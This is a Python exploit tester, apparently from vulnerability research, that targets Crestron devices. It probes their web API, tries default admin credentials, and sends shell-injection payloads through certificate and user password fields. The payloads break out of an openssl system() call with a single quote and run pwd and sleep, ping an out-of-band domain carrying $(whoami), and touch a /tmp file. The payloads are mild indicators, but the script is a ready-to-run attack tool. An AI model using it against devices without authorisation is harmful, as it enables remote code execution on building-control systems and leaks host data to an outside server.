#!/usr/bin/env python3
"""
Crestron Certificate Password Command Injection Tester
[REDACTED-ID]_001: REST API → Certificate Password → system("openssl ... pass:'%s'") → RCE

Based on static analysis of:
- libCrestronProtocolHandler.so: CertificateStoreServiceImpl::passwordForAddWebServerCertificate()
  → consoleInterface::runCommand() with password interpolated into CTP command
- a_console: FUN_00027970 → system("openssl pkcs12 -in %s -passin pass:'%s' ...")
  → Zero validation on password between REST API and system() call

Injection vector: Single quote ' in password breaks out of shell quoting
  Password: test' ; <command> ; echo '
  Shell sees: openssl ... -passin pass:'test' ; <command> ; echo '' ...

Attack surface:
- 4 certificate password endpoints:
  1. AddCertificate (802.1x)
  2. AddSipCertificate
  3. AddMachineCertificate
  4. AddWebServerCertificate (direct runCommand path)
"""

import sys
import os
import json
import time
import socket
import ssl
import http.client
import base64
import hashlib
from urllib.parse import urlencode

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from crestron_common import EvidenceCollector


class CrestronCertInjectionTester:
    """Test certificate password OS command injection on Crestron devices."""

    def __init__(self, host, port=443, use_ssl=True, timeout=15):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.timeout = timeout
        self.ec = EvidenceCollector("cert_password_injection")
        self.session_cookie = None
        self.csrf_token = None

    def _make_request(self, method, path, body=None, headers=None, content_type=None):
        """Make HTTP/HTTPS request to device."""
        if headers is None:
            headers = {}
        if self.session_cookie:
            headers["Cookie"] = self.session_cookie
        if self.csrf_token:
            headers["X-CSRF-Token"] = self.csrf_token
        if content_type:
            headers["Content-Type"] = content_type

        try:
            if self.use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(self.host, self.port,
                                                     timeout=self.timeout, context=ctx)
            else:
                conn = http.client.HTTPConnection(self.host, self.port,
                                                    timeout=self.timeout)

            conn.request(method, path, body=body, headers=headers)
            resp = conn.getresponse()
            resp_body = resp.read()
            resp_headers = dict(resp.getheaders())

            # Capture session cookies
            if "set-cookie" in resp_headers:
                self.session_cookie = resp_headers["set-cookie"].split(";")[0]
            if "x-csrf-token" in resp_headers:
                self.csrf_token = resp_headers["x-csrf-token"]

            conn.close()
            return {
                "status": resp.status,
                "reason": resp.reason,
                "headers": resp_headers,
                "body": resp_body.decode("utf-8", errors="replace"),
                "raw": resp_body
            }
        except Exception as e:
            return {"status": 0, "reason": str(e), "headers": {}, "body": "", "raw": b""}

    def phase1_discover_web_interface(self):
        """Discover the web management interface and API endpoints."""
        print("\n[*] Phase 1: Web Interface Discovery")

        # Try common Crestron web paths
        discovery_paths = [
            ("GET", "/", "Root page"),
            ("GET", "/Device", "Device API root"),
            ("GET", "/Device/DeviceInfo", "Device info endpoint"),
            ("GET", "/Device/Authentication", "Authentication endpoint"),
            ("GET", "/Device/CertificateStore", "Certificate store endpoint"),
            ("GET", "/Device/CertificateStore/AddCertificate", "Add certificate endpoint"),
            ("GET", "/Device/CertificateStore/AddWebServerCertificate", "Add web server cert"),
            ("GET", "/Device/CertificateStore/AddMachineCertificate", "Add machine cert"),
            ("GET", "/Device/CertificateStore/AddSipCertificate", "Add SIP cert"),
            ("GET", "/api", "API root"),
            ("GET", "/cws/login", "CWS login"),
            ("GET", "/uri/info", "URI info"),
            ("GET", "/userlogin.html", "User login page"),
            ("GET", "/createUser.html", "Create user page"),
        ]

        for method, path, desc in discovery_paths:
            test_id = f"DISC-{path.replace('/', '-').strip('-')}"
            resp = self._make_request(method, path)
            status = "INFO"
            if resp["status"] in (200, 301, 302):
                print(f"  [+] {path}: {resp['status']} ({len(resp['body'])} bytes)")
                status = "FOUND"
            elif resp["status"] == 401:
                print(f"  [!] {path}: 401 Unauthorized (requires auth)")
                status = "AUTH_REQUIRED"
            elif resp["status"] == 403:
                print(f"  [!] {path}: 403 Forbidden")
            elif resp["status"] == 0:
                print(f"  [-] {path}: {resp['reason']}")
                status = "ERROR"
            else:
                print(f"  [-] {path}: {resp['status']}")

            self.ec.add_test(test_id, desc, f"{method} {path}",
                           f"Status: {resp['status']}, Body: {resp['body'][:200]}",
                           status=status)

    def phase2_authenticate(self, username="admin", password="admin"):
        """Authenticate to the web interface."""
        print(f"\n[*] Phase 2: Authentication (user={username})")

        # Try JSON auth
        auth_endpoints = [
            ("/Device/Authentication", "application/json",
             json.dumps({"User": username, "Password": password})),
            ("/cws/login", "application/x-www-form-urlencoded",
             urlencode({"login": username, "passwd": password})),
            ("/userlogin.html", "application/x-www-form-urlencoded",
             urlencode({"login": username, "passwd": password})),
        ]

        for endpoint, ctype, body in auth_endpoints:
            test_id = f"AUTH-{endpoint.replace('/', '-').strip('-')}"
            resp = self._make_request("POST", endpoint, body=body, content_type=ctype)

            if resp["status"] in (200, 302):
                print(f"  [+] {endpoint}: {resp['status']} — Possible auth success")
                if self.session_cookie:
                    print(f"      Session: {self.session_cookie[:50]}...")
                self.ec.add_test(test_id, f"Auth via {endpoint}",
                               f"POST {endpoint} user={username}",
                               f"Status: {resp['status']}, Cookie: {self.session_cookie}",
                               status="AUTH_SUCCESS")
                return True
            else:
                print(f"  [-] {endpoint}: {resp['status']}")
                self.ec.add_test(test_id, f"Auth via {endpoint}",
                               f"POST {endpoint} user={username}",
                               f"Status: {resp['status']}, Body: {resp['body'][:200]}")

        # Try Basic auth header
        basic_auth = base64.b64encode(f"{username}:{password}".encode()).decode()
        resp = self._make_request("GET", "/Device/DeviceInfo",
                                  headers={"Authorization": f"Basic {basic_auth}"})
        if resp["status"] == 200:
            print(f"  [+] Basic auth accepted for /Device/DeviceInfo")
            self.ec.add_test("AUTH-BASIC", "Basic auth",
                           f"Authorization: Basic {basic_auth}",
                           f"Status: {resp['status']}")
            return True

        return False

    def phase3_test_certificate_injection(self):
        """Test certificate password command injection.

        The injection targets: system("openssl pkcs12 -in %s -passin pass:'%s' ...")
        The password is wrapped in single quotes in the shell command.
        Injecting ' breaks out of the quoting context.
        """
        print("\n[*] Phase 3: Certificate Password Command Injection Testing")
        print("    Target: system(\"openssl ... -passin pass:'%s'\")")
        print("    Vector: Single quote ' in password breaks shell quoting")

        # Test endpoints for certificate operations
        # Exact paths from Angular frontend analysis of TSW firmware
        cert_endpoints = [
            "/Device/CertificateStore/Root/AddCertificate",   # Root certificate (802.1x)
            "/Device/CertificateStore/Sip/AddCertificate",    # SIP certificate
            "/Device/CertificateStore",                        # Main certificate store
            "/Device/CertificateStore/",                       # Trailing slash variant
        ]

        # Generate a minimal PKCS12 file (self-signed) for upload
        # In practice, we just need SOMETHING that the endpoint will try to process
        # The injection happens when openssl tries to read the file with the password
        dummy_cert = base64.b64encode(b"\x00" * 100).decode()

        # Injection payloads — designed for system("openssl ... -passin pass:'PAYLOAD' ...")
        # Safe RCE validation: First command is ALWAYS pwd
        injection_payloads = [
            # Canary tests first — see if quotes pass through
            ("CERT-INJ-001", "normalpassword", "Baseline — normal password"),
            ("CERT-INJ-002", "test'test", "Single quote in password"),
            ("CERT-INJ-003", 'test"test', "Double quote in password"),
            ("CERT-INJ-004", "test\\test", "Backslash in password"),

            # Command injection via single quote escape
            # system("openssl ... -passin pass:'PAYLOAD'")
            # With PAYLOAD = test' ; pwd ; echo '
            # Becomes: pass:'test' ; pwd ; echo '' ...
            ("CERT-INJ-010", "test' ; pwd ; echo '", "Single quote escape + pwd"),

            # Time-based blind injection (if no output reflected)
            ("CERT-INJ-020", "test' ; sleep 5 ; echo '", "Time-based blind — 5s sleep"),

            # DNS callback injection (for blind OOB)
            # Use a Burp Collaborator or similar OOB domain
            ("CERT-INJ-030", "test' ; ping -c 1 $(whoami).cert-inj.oob.test ; echo '",
             "OOB DNS callback — requires OOB server"),

            # File creation indicator
            ("CERT-INJ-040", "test' ; touch /tmp/.crestron_rce_test ; echo '",
             "File creation indicator"),
        ]

        for endpoint in cert_endpoints:
            print(f"\n  Testing: {endpoint}")

            for test_id, password, desc in injection_payloads:
                full_test_id = f"{test_id}-{endpoint.split('/')[-1]}"

                # Try JSON POST with certificate data and password
                # The exact JSON structure depends on the Crestron API version
                # Common structures observed in firmware analysis:
                json_bodies = [
                    # Structure 1: Flat JSON
                    json.dumps({
                        "Device.CertificateStore.AddWebServerCertificate": {
                            "Certificate": {"Name": "test.pfx", "Password": password}
                        }
                    }),
                    # Structure 2: Simple fields
                    json.dumps({
                        "Name": "test.pfx",
                        "Password": password,
                        "Certificate": dummy_cert
                    }),
                    # Structure 3: Actions format (observed in REST API patterns)
                    json.dumps({
                        "Actions": [{
                            "Operation": "SetPartial",
                            "Results": [{
                                "Path": endpoint.replace("/Device/", "Device.").replace("/", "."),
                                "Property": "Password",
                                "Value": password
                            }],
                            "TargetObject": "CertificateStore"
                        }]
                    }),
                ]

                for i, body in enumerate(json_bodies):
                    start_time = time.time()
                    resp = self._make_request("POST", endpoint, body=body,
                                            content_type="application/json")
                    elapsed = time.time() - start_time

                    status = "INFO"
                    notes = []

                    # Check for injection indicators
                    if resp["status"] == 0:
                        notes.append("CONNECTION_ERROR")
                        status = "ERROR"
                    elif elapsed > 4.5 and "sleep" in password:
                        notes.append(f"TIMING_ANOMALY: {elapsed:.1f}s (expected ~5s for sleep)")
                        status = "ANOMALY"
                        self.ec.add_anomaly(full_test_id,
                                          f"Time-based blind injection indicator: {elapsed:.1f}s")
                    elif resp["status"] == 500:
                        notes.append("SERVER_ERROR — may indicate command processing")
                        status = "ANOMALY"

                    # Check response for command output
                    body_text = resp["body"]
                    if any(x in body_text for x in ["/opt", "/home", "/root", "/crestron",
                                                      "/mnt", "/usr", "uid=", "root"]):
                        notes.append("INJECTION_INDICATOR in response!")
                        status = "CRITICAL"
                        self.ec.add_finding(full_test_id, "CRITICAL",
                                          f"Certificate password command injection: {desc}",
                                          f"Endpoint: {endpoint}\n"
                                          f"Password: {repr(password)}\n"
                                          f"Response: {body_text[:500]}")

                    note_str = " | ".join(notes) if notes else "No anomaly"
                    print(f"    [{full_test_id}] fmt{i}: {resp['status']} "
                          f"({elapsed:.1f}s) {note_str}")

                    self.ec.add_test(f"{full_test_id}-fmt{i}",
                                   f"{desc} (format {i})",
                                   f"POST {endpoint} password={repr(password[:30])}",
                                   f"Status: {resp['status']}, Time: {elapsed:.1f}s, "
                                   f"Body: {body_text[:200]}",
                                   status=status)

                    # Only test first format if endpoint returns 404
                    if resp["status"] == 404:
                        break

    def phase4_test_user_password_injection(self):
        """Test user password injection via ADDUSER/RESETPASSWORD paths."""
        print("\n[*] Phase 4: User Password Injection Testing")
        print("    Target: REST API → ADDUSER/RESETPASSWORD → busybox sed → system()")

        # Safe test payloads for user creation/password reset
        user_payloads = [
            ("USR-INJ-001", "testcf", "normalpass", "Baseline normal password"),
            ("USR-INJ-002", "testcf", "test'test", "Single quote in password"),
            ("USR-INJ-003", "testcf", "test$(pwd)", "Command substitution attempt"),
            ("USR-INJ-004", "testcf", "test`pwd`", "Backtick substitution"),
            ("USR-INJ-005", "testcf", "test\npwd", "Newline injection"),
        ]

        user_endpoints = [
            "/Device/Authentication",                          # Main auth endpoint
            "/Device/Authentication/",                         # Trailing slash variant
        ]

        for endpoint in user_endpoints:
            print(f"\n  Testing: {endpoint}")

            for test_id, username, password, desc in user_payloads:
                full_test_id = f"{test_id}-{endpoint.split('/')[-1]}"

                json_bodies = [
                    json.dumps({"User": username, "Password": password}),
                    json.dumps({"Name": username, "Password": password,
                               "Group": "Administrators"}),
                    json.dumps({
                        "Actions": [{
                            "Operation": "SetPartial",
                            "Results": [{
                                "Path": "Device.Authentication.AddUser",
                                "Property": "Name",
                                "Value": username
                            }, {
                                "Path": "Device.Authentication.AddUser",
                                "Property": "Password",
                                "Value": password
                            }],
                            "TargetObject": "Authentication"
                        }]
                    }),
                ]

                for i, body in enumerate(json_bodies):
                    resp = self._make_request("POST", endpoint, body=body,
                                            content_type="application/json")

                    body_text = resp["body"]
                    status = "INFO"
                    if any(x in body_text for x in ["/opt", "/home", "/root", "uid="]):
                        status = "CRITICAL"
                        self.ec.add_finding(full_test_id, "CRITICAL",
                                          f"User password command injection: {desc}",
                                          f"Endpoint: {endpoint}\nPassword: {repr(password)}\n"
                                          f"Response: {body_text[:500]}")

                    print(f"    [{full_test_id}] fmt{i}: {resp['status']} "
                          f"Body: {body_text[:80]}")

                    self.ec.add_test(f"{full_test_id}-fmt{i}", desc,
                                   f"POST {endpoint} user={username} pass={repr(password[:20])}",
                                   f"Status: {resp['status']}, Body: {body_text[:200]}",
                                   status=status)

                    if resp["status"] == 404:
                        break

    def run_all(self, username="admin", password="admin"):
        """Run all injection tests."""
        print("=" * 60)
        print(f"Crestron Certificate Password Injection Tester")
        print(f"Target: {self.host}:{self.port} (SSL={self.use_ssl})")
        print("=" * 60)

        self.phase1_discover_web_interface()
        auth_ok = self.phase2_authenticate(username, password)

        if not auth_ok:
            print("\n[!] Authentication failed — testing unauthenticated access")
            print("    Some endpoints may still be accessible")

        self.phase3_test_certificate_injection()
        self.phase4_test_user_password_injection()

        self.ec.save()
        print(f"\n[*] Assessment complete. Findings: {len(self.ec.findings)}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_host> [port] [--no-ssl] [--user USER] [--pass PASS]")
        print()
        print("Tests Crestron certificate password command injection ([REDACTED-ID]_001)")
        print()
        print("  Chain: REST API → CertificateStoreServiceImpl → runCommand()")
        print("       → a_console → system(\"openssl ... pass:'%s'\")")
        print()
        print("Options:")
        print("  --no-ssl    Use HTTP instead of HTTPS")
        print("  --user USER Admin username (default: admin)")
        print("  --pass PASS Admin password (default: admin)")
        print()
        print("Examples:")
        print(f"  {sys.argv[0]} [REDACTED-INTERNAL-IP]")
        print(f"  {sys.argv[0]} [REDACTED-INTERNAL-IP] 443 --user admin --pass crestron")
        print(f"  {sys.argv[0]} [REDACTED-INTERNAL-IP] 80 --no-ssl")
        sys.exit(1)

    target = sys.argv[1]
    port = 443
    use_ssl = True
    username = "admin"
    password = "admin"

    args = sys.argv[2:]
    i = 0
    while i < len(args):
        if args[i] == "--no-ssl":
            use_ssl = False
            if port == 443:
                port = 80
        elif args[i] == "--user" and i + 1 < len(args):
            username = args[i + 1]
            i += 1
        elif args[i] == "--pass" and i + 1 < len(args):
            password = args[i + 1]
            i += 1
        elif args[i].isdigit():
            port = int(args[i])
        i += 1

    tester = CrestronCertInjectionTester(target, port, use_ssl)
    tester.run_all(username, password)
